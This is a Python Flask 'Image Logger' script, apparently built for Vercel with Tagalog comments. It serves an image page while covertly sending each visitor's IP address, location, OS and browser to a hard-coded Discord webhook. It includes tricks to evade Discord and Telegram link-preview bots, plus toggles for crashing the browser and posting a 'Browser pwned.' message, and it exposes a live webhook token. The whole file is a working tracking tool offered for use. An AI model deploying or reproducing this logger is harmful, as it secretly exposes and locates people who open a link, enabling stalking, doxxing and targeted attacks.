from flask import Flask, request, redirect, Response
import requests
import base64
import httpagentparser
import traceback

# CRITICAL: Kailangan 'app' ang pangalan nito para sa Vercel
app = Flask(__name__)

config = {
    "webhook": "https://canary.discord.com/api/webhooks/1488923621379412259/PI5pWZb5lzfCjcgBuLcUwxy8kvWMlwuHJPvA4tGpzqWwmV6gmZPM_cuDJXmkLqljxbG4",
    "image": "https://s3-eu-west-1.amazonaws.com/tpd/logos/658818456b62ffe60083e998/0x0.png",
    "imageArgument": True,
    "username": "Image Logger",
    "color": 0x00FFFF,
    "crashBrowser": False,
    "accurateLocation": False,
    "message": {
        "doMessage": False,
        "message": "Browser pwned.",
        "richMessage": True,
    },
    "vpnCheck": 1,
    "linkAlerts": True,
    "buggedImage": True,
    "antiBot": 1,
    "redirect": {
        "redirect": False,
        "page": "https://your-link.here"
    }
}

blacklistedIPs = ("27", "104", "143", "164")
loading_img = base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")): return "Discord"
    if useragent and "TelegramBot" in useragent: return "Telegram"
    return False

def makeReport(ip, useragent, coords=None, endpoint="N/A", url=None):
    if ip.startswith(blacklistedIPs): return
    bot = botCheck(ip, useragent)
    
    # Payload para sa Discord Webhook
    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    os, browser = httpagentparser.simple_detect(useragent)
    
    content = f"**IP Logged!**\n**IP:** `{ip}`\n**Country:** `{info.get('country', 'Unknown')}`\n**OS:** `{os}`\n**Browser:** `{browser}`"
    
    payload = {
        "username": config["username"],
        "embeds": [{
            "title": "Image Logger Alert",
            "color": config["color"],
            "description": content
        }]
    }
    requests.post(config["webhook"], json=payload)

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def catch_all(path):
    try:
        # Kinukuha ang Real IP mula sa Vercel header
        ip = request.headers.get('x-forwarded-for', request.remote_addr).split(',')[0]
        ua = request.headers.get('user-agent', '')
        
        url = config["image"]
        if config["imageArgument"] and request.args.get('url'):
            try:
                url = base64.b64decode(request.args.get('url')).decode()
            except:
                pass

        makeReport(ip, ua, endpoint=path, url=url)

        if config["redirect"]["redirect"]:
            return redirect(config["redirect"]["page"])
            
        if botCheck(ip, ua) and config["buggedImage"]:
            return Response(loading_img, mimetype='image/jpeg')

        html = f"<html><body style='margin:0;'><img src='{url}' style='width:100%;height:100%;object-fit:contain;'></body></html>"
        return html
    except Exception:
        print(traceback.format_exc())
        return "Internal Error", 500

